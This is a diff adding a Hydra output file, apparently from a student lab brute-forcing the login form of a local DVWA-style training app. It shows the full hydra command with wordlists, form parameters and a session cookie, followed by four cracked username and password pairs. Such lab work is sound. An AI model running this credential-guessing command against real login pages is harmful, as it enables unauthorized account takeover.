@@ -1,0 +1,5 @@
+# Hydra v9.6 run at 2025-09-29 22:13:53 on 127.0.0.1 http-get-form (hydra -L /Users/diego/Desktop/Criptografia/Lab02/top-usernames-shortlist.txt -P /Users/diego/Desktop/Criptografia/Lab02/Pwdb_top-1000.txt -o hydra_results.txt -b text http-get-form://127.0.0.1:4280/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=quhvno6km4g0h3bkngkref2op5;security=low:F=Username and/or password incorrect)
+[4280][http-get-form] host: 127.0.0.1   login: admin   password: password
+[4280][http-get-form] host: 127.0.0.1   login: gordonb   password: abc123
+[4280][http-get-form] host: 127.0.0.1   login: pablo   password: letmein
+[4280][http-get-form] host: 127.0.0.1   login: smithy   password: password
